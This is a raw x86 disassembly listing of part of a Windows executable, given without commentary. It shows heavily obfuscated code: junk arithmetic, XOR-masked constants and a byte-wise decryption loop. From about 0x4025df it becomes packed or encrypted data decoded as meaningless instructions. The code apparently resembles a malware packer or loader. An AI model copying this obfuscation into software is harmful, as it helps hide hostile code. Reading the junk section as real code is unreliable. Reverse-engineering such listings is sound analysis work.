  401df8:	xor    DWORD PTR ds:0x434008,0x435014
  401e02:	push   0x43a520
  401e07:	push   ebx
  401e08:	push   ebx
  401e09:	call   DWORD PTR ds:0x43a8fc
  401e0f:	test   eax,eax
  401e11:	mov    DWORD PTR ds:0x435004,0x62c7
  401e1b:	jne    0x40241c
  401e21:	sub    DWORD PTR ds:0x437000,0x3add
  401e2b:	push   0xd
  401e2d:	push   0x43a530
  401e32:	call   DWORD PTR ds:0x43a908
  401e38:	test   eax,eax
  401e3a:	mov    DWORD PTR ds:0x435010,0x130a
  401e44:	jne    0x402440
  401e4a:	and    DWORD PTR ds:0x434018,0x434024
  401e54:	push   0x43a544
  401e59:	push   ebx
  401e5a:	push   ebx
  401e5b:	call   DWORD PTR ds:0x43a8ec
  401e61:	test   eax,eax
  401e63:	mov    DWORD PTR ds:0x436008,0x3823
  401e6d:	jne    0x402440
  401e73:	adc    DWORD PTR ds:0x436014,0x437014
  401e7d:	push   0x9
  401e7f:	sub    DWORD PTR ds:0x437014,0x437010
  401e89:	push   0x43a55c
  401e8e:	call   DWORD PTR ds:0x43a8cc
  401e94:	not    DWORD PTR ds:0x43800c
  401e9a:	test   eax,eax
  401e9c:	mov    DWORD PTR ds:0x43501c,0x69de
  401ea6:	jne    0x40241c
  401eac:	sbb    DWORD PTR ds:0x436018,0x435008
  401eb6:	push   0x43a578
  401ebb:	push   ebx
  401ebc:	sub    DWORD PTR ds:0x438018,0x435008
  401ec6:	push   ebx
  401ec7:	call   DWORD PTR ds:0x43a8fc
  401ecd:	test   eax,eax
  401ecf:	mov    DWORD PTR ds:0x435018,0x17d7
  401ed9:	jne    0x40241c
  401edf:	sub    DWORD PTR ds:0x436010,0x435008
  401ee9:	push   0xd
  401eeb:	adc    DWORD PTR ds:0x43700c,0x43400c
  401ef5:	push   0x43a588
  401efa:	sbb    DWORD PTR ds:0x437014,0x437000
  401f04:	call   DWORD PTR ds:0x43a908
  401f0a:	test   eax,eax
  401f0c:	mov    DWORD PTR ds:0x434024,0x6a5c
  401f16:	jne    0x402440
  401f1c:	mov    eax,DWORD PTR [ebp-0x8]
  401f1f:	and    DWORD PTR ds:0x43500c,0x0
  401f29:	mov    ecx,DWORD PTR ds:0x43500c
  401f2f:	inc    ecx
  401f30:	mov    DWORD PTR ds:0x43500c,ecx
  401f36:	cmp    DWORD PTR ds:0x43500c,0x9
  401f3d:	ja     0x401f75
  401f43:	jmp    0x401f4e
  401f48:	call   DWORD PTR ds:0x43a904
  401f4e:	cmp    DWORD PTR ds:0x43500c,0x8
  401f55:	jne    0x401f68
  401f5b:	mov    ecx,DWORD PTR ds:0x43500c
  401f61:	inc    ecx
  401f62:	mov    DWORD PTR ds:0x43500c,ecx
  401f68:	cmp    DWORD PTR ds:0x43500c,0x14
  401f6f:	jb     0x401f29
  401f75:	mov    ecx,DWORD PTR [ebp-0x7c]
  401f78:	xor    eax,esi
  401f7a:	dec    DWORD PTR ds:0x43700c
  401f80:	add    eax,edi
  401f82:	mov    DWORD PTR ds:0x434010,0x1014
  401f8c:	cmp    eax,ecx
  401f8e:	jne    0x4023c3
  401f94:	sbb    DWORD PTR ds:0x437018,0x6417
  401f9e:	mov    eax,DWORD PTR [ebp-0x8]
  401fa1:	mov    ecx,DWORD PTR ds:0x43a2d4
  401fa7:	and    DWORD PTR ds:0x438014,0xc31
  401fb1:	mov    ecx,DWORD PTR [ecx+0x198]
  401fb7:	xor    eax,esi
  401fb9:	sub    DWORD PTR ds:0x436008,0x435010
  401fc3:	add    eax,edi
  401fc5:	cmp    eax,DWORD PTR [ecx]
  401fc7:	jne    0x402025
  401fcd:	movzx  eax,WORD PTR ds:0x435014
  401fd4:	and    DWORD PTR ds:0x434010,eax
  401fda:	mov    eax,DWORD PTR [ebp-0x8]
  401fdd:	adc    DWORD PTR ds:0x434018,0x436008
  401fe7:	push   0xf89c8585
  401fec:	xor    eax,esi
  401fee:	add    eax,edi
  401ff0:	adc    DWORD PTR ds:0x437018,0x127f
  401ffa:	push   eax
  401ffb:	dec    DWORD PTR ds:0x436004
  402001:	push   0xf89c85b9
  402006:	sbb    DWORD PTR ds:0x43501c,0x43600c
  402010:	push   DWORD PTR [ebp-0xc]
  402013:	and    DWORD PTR ds:0x434024,0x7b2c
  40201d:	push   DWORD PTR [ebp-0x8]
  402020:	call   0x407a51
  402025:	mov    eax,DWORD PTR [ebp-0xc]
  402028:	mov    DWORD PTR [ebp-0x4c],eax
  40202b:	mov    eax,DWORD PTR [ebp-0x8]
  40202e:	mov    DWORD PTR [ebp-0x60],eax
  402031:	mov    eax,DWORD PTR [ebp-0x60]
  402034:	xor    eax,esi
  402036:	add    eax,edi
  402038:	mov    DWORD PTR [ebp+0x10],eax
  40203b:	mov    eax,ds:0x43a154
  402040:	mov    eax,DWORD PTR [eax]
  402042:	mov    DWORD PTR [ebp+0x10],eax
  402045:	mov    eax,ds:0x43a35c
  40204a:	mov    eax,DWORD PTR [eax]
  40204c:	mov    DWORD PTR [ebp-0x18],eax
  40204f:	mov    DWORD PTR [ebp+0xc],0xf89c8785
  402056:	mov    eax,DWORD PTR [ebp+0xc]
  402059:	xor    eax,esi
  40205b:	add    eax,edi
  40205d:	mov    DWORD PTR [ebp+0xc],eax
  402060:	mov    eax,ds:0x43a2d4
  402065:	mov    DWORD PTR [ebp+0xc],eax
  402068:	mov    eax,DWORD PTR [ebp+0x10]
  40206b:	mov    DWORD PTR [ebp+0xc],eax
  40206e:	mov    eax,DWORD PTR [ebp+0xc]
  402071:	push   0x4
  402073:	pop    ecx
  402074:	sub    ecx,eax
  402076:	add    ecx,DWORD PTR [ebp-0x18]
  402079:	mov    DWORD PTR [ebp-0x38],0xf89c85c5
  402080:	mov    DWORD PTR [ebp+0x10],ecx
  402083:	mov    DWORD PTR [ebp-0x108],0xf89c85b9
  40208d:	mov    eax,DWORD PTR [ebp+0xc]
  402090:	mov    DWORD PTR [ebp-0x104],eax
  402096:	mov    eax,DWORD PTR [ebp+0x10]
  402099:	mov    DWORD PTR [ebp-0x100],eax
  40209f:	mov    eax,DWORD PTR [ebp-0x38]
  4020a2:	xor    eax,esi
  4020a4:	add    eax,edi
  4020a6:	mov    DWORD PTR [ebp-0xfc],eax
  4020ac:	lea    eax,[ebp-0x98]
  4020b2:	mov    DWORD PTR [ebp-0xf8],eax
  4020b8:	mov    eax,DWORD PTR [ebp-0x108]
  4020be:	xor    eax,esi
  4020c0:	add    eax,edi
  4020c2:	mov    DWORD PTR [ebp-0x108],eax
  4020c8:	lea    eax,[ebp-0x108]
  4020ce:	push   eax
  4020cf:	mov    eax,DWORD PTR [ebp-0x4c]
  4020d2:	xor    eax,esi
  4020d4:	add    eax,edi
  4020d6:	push   eax
  4020d7:	mov    eax,ds:0x43a2f4
  4020dc:	push   0x43a24a
  4020e1:	push   DWORD PTR [eax]
  4020e3:	call   0x404c64
  4020e8:	mov    eax,DWORD PTR [ebp+0xc]
  4020eb:	mov    ecx,DWORD PTR [ebp+0x10]
  4020ee:	mov    DWORD PTR [ebp-0x84],ecx
  4020f4:	mov    ecx,DWORD PTR [ebp-0x60]
  4020f7:	xor    ecx,esi
  4020f9:	mov    DWORD PTR [ebp-0x18],eax
  4020fc:	add    ecx,edi
  4020fe:	jmp    0x402361
  402103:	lea    edx,[ecx+eax*1]
  402106:	mov    DWORD PTR [ebp+0x10],edx
  402109:	mov    edx,DWORD PTR [ebp-0x84]
  40210f:	sub    edx,ecx
  402111:	mov    DWORD PTR [ebp+0xc],edx
  402114:	mov    edx,DWORD PTR [ebp+0xc]
  402117:	mov    DWORD PTR [ebp-0x54],edx
  40211a:	mov    edx,DWORD PTR [ebp+0x10]
  40211d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  402124:	mov    DWORD PTR [ebp-0x6c],edx
  402127:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  40212e:	mov    edx,DWORD PTR [ebp-0x50]
  402131:	xor    edx,esi
  402133:	add    edx,edi
  402135:	mov    DWORD PTR [ebp+0x10],edx
  402138:	mov    edx,DWORD PTR [ebp-0x50]
  40213b:	xor    edx,esi
  40213d:	add    edx,edi
  40213f:	mov    DWORD PTR [ebp+0xc],edx
  402142:	mov    DWORD PTR [ebp-0x68],0xf89c85a5
  402149:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  402150:	mov    edx,DWORD PTR [ebp-0x50]
  402153:	mov    ebx,DWORD PTR [ebp-0x54]
  402156:	xor    edx,esi
  402158:	add    edx,edi
  40215a:	cmp    ebx,edx
  40215c:	je     0x402355
  402162:	mov    eax,DWORD PTR [ebp-0x24]
  402165:	xor    eax,esi
  402167:	mov    edx,0xffcd8d1e
  40216c:	sub    edx,eax
  40216e:	add    edx,DWORD PTR [ebp-0x54]
  402171:	mov    eax,DWORD PTR [ebp-0x24]
  402174:	mov    ebx,DWORD PTR [ebp+0x10]
  402177:	xor    eax,esi
  402179:	add    eax,edi
  40217b:	imul   eax,ebx
  40217e:	cmp    eax,edx
  402180:	ja     0x402352
  402186:	mov    edx,DWORD PTR [ebp+0x10]
  402189:	mov    eax,DWORD PTR [ebp-0x54]
  40218c:	mov    ebx,DWORD PTR [ebp-0x68]
  40218f:	sub    eax,edx
  402191:	xor    ebx,esi
  402193:	xor    edx,edx
  402195:	add    ebx,edi
  402197:	div    ebx
  402199:	mov    DWORD PTR [ebp+0xc],eax
  40219c:	mov    eax,DWORD PTR [ebp-0x74]
  40219f:	mov    edx,DWORD PTR [ebp+0xc]
  4021a2:	xor    eax,esi
  4021a4:	add    eax,edi
  4021a6:	cmp    edx,eax
  4021a8:	jbe    0x4021b8
  4021ae:	mov    eax,DWORD PTR [ebp-0x74]
  4021b1:	xor    eax,esi
  4021b3:	add    eax,edi
  4021b5:	mov    DWORD PTR [ebp+0xc],eax
  4021b8:	mov    eax,DWORD PTR [ebp-0x68]
  4021bb:	mov    edx,DWORD PTR [ebp+0xc]
  4021be:	xor    eax,esi
  4021c0:	add    eax,edi
  4021c2:	imul   eax,edx
  4021c5:	mov    DWORD PTR [ebp+0xc],eax
  4021c8:	mov    eax,DWORD PTR [ebp-0x50]
  4021cb:	mov    edx,DWORD PTR [ebp+0xc]
  4021ce:	xor    eax,esi
  4021d0:	add    eax,edi
  4021d2:	cmp    edx,eax
  4021d4:	je     0x40233b
  4021da:	mov    eax,DWORD PTR [ebp+0xc]
  4021dd:	mov    DWORD PTR [ebp-0x3c],eax
  4021e0:	mov    eax,DWORD PTR [ebp+0x10]
  4021e3:	add    eax,DWORD PTR [ebp-0x6c]
  4021e6:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  4021ed:	mov    DWORD PTR [ebp-0x30],eax
  4021f0:	mov    eax,0xf89c8584
  4021f5:	mov    DWORD PTR [ebp-0x64],eax
  4021f8:	mov    DWORD PTR [ebp-0x58],0xf89c85bb
  4021ff:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  402206:	mov    DWORD PTR [ebp-0x2c],eax
  402209:	mov    eax,DWORD PTR [ebp-0x38]
  40220c:	xor    eax,esi
  40220e:	add    eax,edi
  402210:	jmp    0x4022f7
  402215:	mov    DWORD PTR [ebp-0x78],0xf89c85b3
  40221c:	mov    DWORD PTR [ebp-0x80],0xf89c85a9
  402223:	mov    eax,DWORD PTR [ebp-0x2c]
  402226:	mov    edx,DWORD PTR [ebp+0xc]
  402229:	xor    eax,esi
  40222b:	add    eax,edi
  40222d:	imul   eax,edx
  402230:	mov    edx,DWORD PTR [ebp-0x30]
  402233:	mov    al,BYTE PTR [eax+edx*1]
  402236:	mov    BYTE PTR [ebp-0x1],al
  402239:	mov    eax,DWORD PTR [ebp-0x2c]
  40223c:	mov    edx,DWORD PTR [ebp+0xc]
  40223f:	xor    eax,esi
  402241:	add    eax,edi
  402243:	imul   eax,edx
  402246:	mov    edx,DWORD PTR [ebp-0x58]
  402249:	xor    edx,esi
  40224b:	add    eax,edx
  40224d:	mov    edx,DWORD PTR [ebp-0x30]
  402250:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  402258:	mov    edx,DWORD PTR [ebp-0x78]
  40225b:	xor    edx,esi
  40225d:	lea    eax,[edx+eax*1+0x3272e2]
  402264:	movzx  edx,BYTE PTR [ebp-0x1]
  402268:	xor    edx,eax
  40226a:	mov    BYTE PTR [ebp-0x1],dl
  40226d:	mov    al,BYTE PTR [ebp-0x1]
  402270:	mov    edx,DWORD PTR [ebp-0x2c]
  402273:	mov    ebx,DWORD PTR [ebp+0xc]
  402276:	xor    edx,esi
  402278:	add    edx,edi
  40227a:	imul   edx,ebx
  40227d:	mov    ebx,DWORD PTR [ebp-0x30]
  402280:	mov    BYTE PTR [edx+ebx*1],al
  402283:	mov    eax,DWORD PTR [ebp-0x2c]
  402286:	mov    edx,DWORD PTR [ebp+0xc]
  402289:	xor    eax,esi
  40228b:	add    eax,edi
  40228d:	imul   eax,edx
  402290:	mov    edx,DWORD PTR [ebp-0x30]
  402293:	mov    al,BYTE PTR [eax+edx*1]
  402296:	mov    BYTE PTR [ebp-0x1],al
  402299:	mov    eax,DWORD PTR [ebp-0x2c]
  40229c:	mov    edx,DWORD PTR [ebp+0xc]
  40229f:	xor    eax,esi
  4022a1:	add    eax,edi
  4022a3:	imul   eax,edx
  4022a6:	mov    edx,DWORD PTR [ebp-0x64]
  4022a9:	xor    edx,esi
  4022ab:	add    eax,edx
  4022ad:	mov    edx,DWORD PTR [ebp-0x30]
  4022b0:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e2]
  4022b8:	mov    edx,DWORD PTR [ebp-0x80]
  4022bb:	xor    edx,esi
  4022bd:	lea    eax,[edx+eax*1+0x3272e2]
  4022c4:	movzx  edx,BYTE PTR [ebp-0x1]
  4022c8:	xor    edx,eax
  4022ca:	mov    BYTE PTR [ebp-0x1],dl
  4022cd:	mov    al,BYTE PTR [ebp-0x1]
  4022d0:	mov    edx,DWORD PTR [ebp-0x2c]
  4022d3:	mov    ebx,DWORD PTR [ebp+0xc]
  4022d6:	xor    edx,esi
  4022d8:	add    edx,edi
  4022da:	imul   edx,ebx
  4022dd:	mov    ebx,DWORD PTR [ebp-0x30]
  4022e0:	mov    BYTE PTR [edx+ebx*1],al
  4022e3:	mov    eax,DWORD PTR [ebp-0x10]
  4022e6:	mov    edx,DWORD PTR [ebp-0x64]
  4022e9:	xor    eax,esi
  4022eb:	xor    edx,esi
  4022ed:	add    eax,edi
  4022ef:	add    edx,edi
  4022f1:	imul   eax,edx
  4022f4:	add    eax,DWORD PTR [ebp+0xc]
  4022f7:	mov    DWORD PTR [ebp+0xc],eax
  4022fa:	mov    eax,DWORD PTR [ebp+0xc]
  4022fd:	mov    edx,DWORD PTR [ebp-0x3c]
  402300:	cmp    edx,eax
  402302:	jb     0x402215
  402308:	mov    eax,DWORD PTR [ebp-0x64]
  40230b:	mov    edx,DWORD PTR [ebp-0x3c]
  40230e:	xor    eax,esi
  402310:	add    eax,edi
  402312:	imul   eax,edx
  402315:	mov    edx,DWORD PTR [ebp-0x38]
  402318:	xor    edx,esi
  40231a:	add    edx,edi
  40231c:	or     eax,edx
  40231e:	mov    edx,DWORD PTR [ebp-0x24]
  402321:	xor    edx,esi
  402323:	add    eax,edx
  402325:	mov    edx,DWORD PTR [ebp-0x24]
  402328:	xor    edx,esi
  40232a:	add    eax,edx
  40232c:	mov    edx,DWORD PTR [ebp+0x10]
  40232f:	lea    eax,[eax+edx*1+0x64e5c4]
  402336:	jmp    0x40234a
  40233b:	mov    eax,DWORD PTR [ebp-0x24]
  40233e:	mov    edx,DWORD PTR [ebp+0x10]
  402341:	xor    eax,esi
  402343:	lea    eax,[eax+edx*1+0x3272e2]
  40234a:	mov    DWORD PTR [ebp+0x10],eax
  40234d:	jmp    0x402162
  402352:	mov    eax,DWORD PTR [ebp-0x18]
  402355:	mov    edx,DWORD PTR [ebp-0x4c]
  402358:	xor    edx,esi
  40235a:	lea    ecx,[ecx+edx*1+0x3272e2]
  402361:	lea    edx,[ecx-0x3272e2]
  402367:	xor    edx,esi
  402369:	cmp    edx,0xf89c9585
  40236f:	jne    0x402103
  402375:	mov    ecx,DWORD PTR [ebp-0x60]
  402378:	mov    edx,DWORD PTR [ebp-0x4c]
  40237b:	mov    ebx,DWORD PTR [ebp-0x60]
  40237e:	xor    edx,esi
  402380:	mov    dl,BYTE PTR [edx+eax*1+0x3272e2]
  402387:	xor    ecx,esi
  402389:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  402390:	xor    ebx,esi
  402392:	mov    BYTE PTR [ebx+eax*1+0x3272e2],dl
  402399:	mov    edx,DWORD PTR [ebp-0x4c]
  40239c:	xor    edx,esi
  40239e:	mov    BYTE PTR [edx+eax*1+0x3272e2],cl
  4023a5:	mov    eax,DWORD PTR [ebp-0x4c]
  4023a8:	mov    eax,DWORD PTR [ebp-0x8]
  4023ab:	xor    eax,esi
  4023ad:	add    eax,edi
  4023af:	mov    ds:0x43a358,eax
  4023b4:	mov    eax,DWORD PTR [ebp-0x8]
  4023b7:	xor    eax,esi
  4023b9:	add    eax,edi
  4023bb:	xor    ebx,ebx
  4023bd:	mov    ds:0x43a350,eax
  4023c2:	inc    ebx
  4023c3:	lea    eax,[ebp-0x40]
  4023c6:	mov    DWORD PTR [ebp-0x88],eax
  4023cc:	lea    eax,[ebp+0x4]
  4023cf:	mov    DWORD PTR [ebp-0x40],eax
  4023d2:	mov    eax,DWORD PTR [ebp-0x40]
  4023d5:	test   eax,eax
  4023d7:	je     0x402572
  4023dd:	push   0x43a59c
  4023e2:	push   ebx
  4023e3:	push   ebx
  4023e4:	call   DWORD PTR ds:0x43a8ec
  4023ea:	test   eax,eax
  4023ec:	jne    0x402440
  4023f2:	push   0x9
  4023f4:	push   0x43a5b4
  4023f9:	call   DWORD PTR ds:0x43a8cc
  4023ff:	test   eax,eax
  402401:	jne    0x40241c
  402407:	push   0x43a5d0
  40240c:	push   ebx
  40240d:	push   ebx
  40240e:	call   DWORD PTR ds:0x43a8fc
  402414:	test   eax,eax
  402416:	je     0x40242b
  40241c:	lea    eax,[ebp-0x20]
  40241f:	push   eax
  402420:	call   DWORD PTR ds:0x43a8bc
  402426:	jmp    0x40258d
  40242b:	push   0xd
  40242d:	push   0x43a5e0
  402432:	call   DWORD PTR ds:0x43a908
  402438:	test   eax,eax
  40243a:	je     0x402447
  402440:	xor    eax,eax
  402442:	jmp    0x40258d
  402447:	mov    DWORD PTR [ebp-0x94],0xf152c3c
  402451:	mov    DWORD PTR [ebp-0xa0],0x712ed0f
  40245b:	mov    DWORD PTR [ebp-0x8c],0x373fc2d
  402465:	mov    DWORD PTR [ebp-0x90],0x72670a1d
  40246f:	call   0x405387
  402474:	mov    eax,DWORD PTR [ebp-0x28]
  402477:	mov    eax,DWORD PTR [ebp-0xc]
  40247a:	mov    eax,DWORD PTR [ebp-0x8]
  40247d:	mov    DWORD PTR [ebp+0xc],eax
  402480:	mov    eax,eax
  402482:	mov    eax,ds:0x43a2d4
  402487:	mov    eax,DWORD PTR [eax+0x1c8]
  40248d:	mov    eax,DWORD PTR [eax]
  40248f:	cdq    
  402490:	mov    ebx,eax
  402492:	mov    eax,0xfabdbee7
  402497:	add    ebx,eax
  402499:	adc    edx,0xffffffff
  40249c:	and    DWORD PTR [ebp-0x10],0x0
  4024a0:	xor    edx,0x0
  4024a3:	mov    DWORD PTR [ebp-0x6c],edx
  4024a6:	mov    edx,DWORD PTR [ebp+0xc]
  4024a9:	mov    DWORD PTR [ebp-0x14],edx
  4024ac:	mov    ecx,0x8a29a12d
  4024b1:	xor    ebx,ecx
  4024b3:	add    DWORD PTR [ebp-0x14],eax
  4024b6:	mov    edx,DWORD PTR [ebp-0x14]
  4024b9:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4024bd:	xor    edx,ecx
  4024bf:	mov    DWORD PTR [ebp-0x5c],edx
  4024c2:	mov    edx,DWORD PTR [ebp-0x10]
  4024c5:	xor    edx,0x0
  4024c8:	mov    DWORD PTR [ebp-0x58],edx
  4024cb:	cmp    DWORD PTR [ebp-0x5c],ebx
  4024ce:	jne    0x4024e0
  4024d4:	mov    edx,DWORD PTR [ebp-0x6c]
  4024d7:	cmp    DWORD PTR [ebp-0x58],edx
  4024da:	je     0x40250f
  4024e0:	mov    edx,DWORD PTR ds:0x43a2d4
  4024e6:	mov    edx,DWORD PTR [edx+0x1c0]
  4024ec:	mov    edx,DWORD PTR [edx]
  4024ee:	xor    ebx,ebx
  4024f0:	add    edx,eax
  4024f2:	adc    ebx,0xffffffff
  4024f5:	xor    edx,ecx
  4024f7:	xor    ebx,0x0
  4024fa:	cmp    edx,0x70941fc5
  402500:	jne    0x402572
  402506:	cmp    ebx,0xffffffff
  402509:	jne    0x402572
  40250f:	mov    edx,DWORD PTR ds:0x43a350
  402515:	mov    ebx,DWORD PTR ds:0x43a358
  40251b:	xor    edx,ebx
  40251d:	mov    DWORD PTR ds:0x43a350,edx
  402523:	mov    edx,DWORD PTR [ebp-0x40]
  402526:	mov    ebx,DWORD PTR ds:0x43a350
  40252c:	add    ebx,DWORD PTR [edx]
  40252e:	mov    edx,DWORD PTR [ebp-0x40]
  402531:	mov    DWORD PTR [edx],ebx
  402533:	mov    edx,DWORD PTR [ebp+0xc]
  402536:	xor    esi,edx
  402538:	mov    edx,DWORD PTR ds:0x43a350
  40253e:	add    esi,edi
  402540:	xor    ebx,ebx
  402542:	add    esi,eax
  402544:	adc    ebx,0xffffffff
  402547:	xor    edi,edi
  402549:	xor    esi,ecx
  40254b:	xor    ebx,0x0
  40254e:	add    edx,eax
  402550:	adc    edi,0xffffffff
  402553:	xor    edx,ecx
  402555:	xor    edi,0x0
  402558:	cmp    edx,esi
  40255a:	jne    0x402572
  402560:	cmp    edi,ebx
  402562:	jne    0x402572
  402568:	mov    eax,ds:0x43a350
  40256d:	mov    ds:0x43a358,eax
  402572:	mov    eax,ds:0x43a2d4
  402577:	push   0x4
  402579:	add    eax,0x1cc
  40257e:	push   eax
  40257f:	lea    eax,[ebp-0x28]
  402582:	push   eax
  402583:	call   0x402598
  402588:	mov    eax,DWORD PTR [ebp-0x28]
  40258b:	mov    eax,DWORD PTR [eax]
  40258d:	pop    edi
  40258e:	pop    ebx
  40258f:	pop    esi
  402590:	leave  
  402591:	ret    0xc
  402594:	xor    eax,eax
  402596:	inc    eax
  402597:	ret    
  402598:	push   ebp
  402599:	mov    ebp,esp
  40259b:	sub    esp,0x10
  40259e:	mov    ecx,DWORD PTR ds:0x438004
  4025a4:	sbb    ecx,DWORD PTR ds:0x434000
  4025aa:	mov    DWORD PTR ds:0x438004,ecx
  4025b0:	mov    eax,0xf89c8585
  4025b5:	add    DWORD PTR ds:0x437018,0x7358
  4025bf:	mov    DWORD PTR [ebp-0x4],eax
  4025c2:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  4025c9:	movzx  edx,WORD PTR ds:0x436014
  4025d0:	sub    DWORD PTR ds:0x43701c,edx
  4025d6:	mov    ecx,DWORD PTR [ebp-0x4]
  4025d9:	dec    edx
  4025da:	jmp    0x404996
  4025df:	sub    DWORD PTR [edx+0x13b763cc],eax
  4025e5:	jae    0x402659
  4025e7:	xchg   ecx,eax
  4025e8:	xchg   esp,eax
  4025e9:	pop    ecx
  4025ea:	int3   
  4025eb:	dec    edi
  4025ec:	mov    ebx,0x7c7c0b2b
  4025f1:	jl     0x40266f
  4025f3:	rcr    DWORD PTR [edi+0x7c],cl
  4025f6:	jl     0x40260d
  4025f8:	cs pop ss
  4025fa:	cmp    DWORD PTR [ecx],edx
  4025fc:	and    eax,0x30652f13
  402601:	popa   
  402602:	pusha  
  402603:	pop    edi
  402604:	jnp    0x402672
  402606:	ins    BYTE PTR es:[edi],dx
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	xor    al,0xc5
  40260a:	fdivp  st(1),st
  40260c:	push   0x42
  40260e:	arpl   WORD PTR [ecx+0x53],di
  402611:	stos   BYTE PTR es:[edi],al
  402612:	jp     0x402681
  402614:	push   ecx
  402615:	iret   
  402616:	pop    ebp
  402617:	dec    esp
  402618:	cmp    cl,BYTE PTR [esi+0x577087fc]
  40261e:	dec    ebp
  40261f:	jg     0x402658
  402621:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402627:	jmp    DWORD PTR cs:[eax-0x22]
  40262b:	cld    
  40262c:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402630:	xor    ebp,ecx
  402632:	mov    esp,0xd82b87ed
  402637:	and    DWORD PTR [ecx],0xf
  40263a:	push   ecx
  40263b:	mov    ds:0x6df7c68c,eax
  402640:	fld    QWORD PTR [esi]
  402642:	(bad)  
  402643:	or     ah,bh
  402645:	and    BYTE PTR [edx],dl
  402647:	inc    edx
  402648:	push   cs
  402649:	and    BYTE PTR [ebx+0x62],ah
  40264c:	mov    cl,0xaf
  40264e:	sub    ebx,DWORD PTR [ecx+0x5]
  402651:	mov    al,ds:0x2341e1ff
  402656:	jbe    0x40268c
  402658:	ret    0xf153
  40265b:	sbb    al,0xfc
  40265d:	jb     0x402618
  40265f:	jnp    0x40263e
  402661:	xchg   edx,eax
  402662:	pop    edi
  402663:	cmp    DWORD PTR [ecx+0x49841607],0xb
  40266a:	cwde   
  40266b:	ds je  0x4025f9
  40266e:	add    ebx,esp
  402670:	sub    eax,0x4b368d54
  402675:	push   esi
  402676:	sti    
  402677:	iret   
  402678:	mov    WORD PTR [ecx],fs
  40267a:	or     edx,0x6982ceb7
  402680:	out    0x45,al
  402682:	push   esp
  402683:	dec    esi
  402684:	push   cs
  402685:	cmp    BYTE PTR [ebx],cl
  402687:	xor    BYTE PTR [ebx],bl
  402689:	lods   eax,DWORD PTR ds:[esi]
  40268a:	inc    ebx
  40268b:	int3   
  40268c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268d:	dec    edx
  40268e:	fiadd  DWORD PTR [esi]
  402690:	push   eax
  402691:	std    
  402692:	push   esp
  402693:	push   eax
  402694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402695:	icebp  
  402696:	bound  edi,QWORD PTR [edi+0x451744f2]
  40269c:	mov    ebx,0x3209b09e
  4026a1:	xchg   ebx,eax
  4026a2:	icebp  
  4026a3:	jbe    0x4026aa
  4026a5:	pop    edx
  4026a6:	ins    DWORD PTR es:[edi],dx
  4026a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026a8:	add    BYTE PTR [ebp-0x55],0x70
  4026ac:	scas   eax,DWORD PTR es:[edi]
  4026ad:	into   
  4026ae:	pushf  
  4026af:	repz jnp 0x402640
  4026b2:	inc    edx
  4026b3:	mov    ah,0xe3
  4026b5:	sahf   
  4026b6:	cdq    
  4026b7:	mov    dl,0x34
  4026b9:	mov    edi,0xbcaa196d
  4026be:	sar    DWORD PTR [ebx+edx*1+0x19],1
  4026c2:	popa   
  4026c3:	adc    BYTE PTR [ebx-0x665623d9],dl
  4026c9:	call   0x411f:0x6d174b96
  4026d0:	cdq    
  4026d1:	adc    DWORD PTR [edi-0x608da2db],eax
  4026d7:	mov    bh,dh
  4026d9:	push   edi
  4026da:	mov    eax,0x15a5d094
  4026df:	(bad)  
  4026e0:	pop    ss
  4026e1:	push   es
  4026e2:	(bad)  
  4026e4:	push   ds
  4026e5:	mov    ss,WORD PTR [edi]
  4026e7:	idiv   DWORD PTR [ebx-0x6e066f18]
  4026ed:	repz out dx,al
  4026ef:	icebp  
  4026f0:	iret   
  4026f1:	pop    eax
  4026f2:	in     eax,0x27
  4026f4:	jecxz  0x402695
  4026f6:	icebp  
  4026f7:	push   esi
  4026f8:	mov    esp,0x2c99c36c
  4026fd:	mov    bh,BYTE PTR [edx+eax*8+0x54]
  402701:	xor    bl,BYTE PTR [esi+0x34]
  402704:	test   BYTE PTR [ebx+eax*1+0xe5cb94b],bl
  40270b:	repz jg 0x4026b8
  40270e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40270f:	dec    edi
  402710:	fisubr WORD PTR [ecx+edi*1+0x64]
  402714:	call   0x4fdc49d7
  402719:	xchg   ebx,eax
  40271a:	xor    BYTE PTR [esi],cl
  40271c:	test   DWORD PTR [ecx+0x1],eax
  40271f:	push   es
  402720:	inc    ebx
  402721:	inc    eax
  402722:	mov    ebp,0xfa187c40
  402727:	outs   dx,BYTE PTR ds:[esi]
  402728:	sub    DWORD PTR [ebx],edi
  40272a:	stos   BYTE PTR es:[edi],al
  40272b:	in     eax,dx
  40272c:	fsubrp st(4),st
  40272e:	ret    
  40272f:	jge    0x4026bf
  402731:	fsubr  st(3),st
  402733:	mov    bl,al
  402735:	xor    al,0x37
  402737:	dec    esp
  402738:	cmp    BYTE PTR es:0xb97ce2a6,bh
  40273f:	xchg   ebx,eax
  402740:	adc    BYTE PTR [edi+edx*2+0x19],0xb8
  402745:	jle    0x402724
  402747:	(bad)  
  402748:	dec    edi
  402749:	dec    esp
  40274a:	add    eax,0xaa8da046
  40274f:	test   DWORD PTR [esi+0x34f7cf94],esp
  402755:	xor    bh,cl
  402757:	mov    edi,0x9226a523
  40275c:	add    al,0x57
  40275e:	loopne 0x402780
  402760:	pop    edi
  402761:	pop    edi
  402762:	xchg   ecx,eax
  402763:	aaa    
  402764:	fsub   DWORD PTR ds:0xad182c84
  40276a:	cmp    eax,0x2b475031
  40276f:	jo     0x40274c
  402771:	ins    DWORD PTR es:[edi],dx
  402772:	lea    esp,[eax-0x37]
  402775:	stos   DWORD PTR es:[edi],eax
  402776:	mov    edx,0x7654a374
  40277b:	ins    BYTE PTR es:[edi],dx
  40277c:	js     0x40271a
  40277e:	jno    0x402771
  402780:	imul   ebp,DWORD PTR [ecx],0x753aa7be
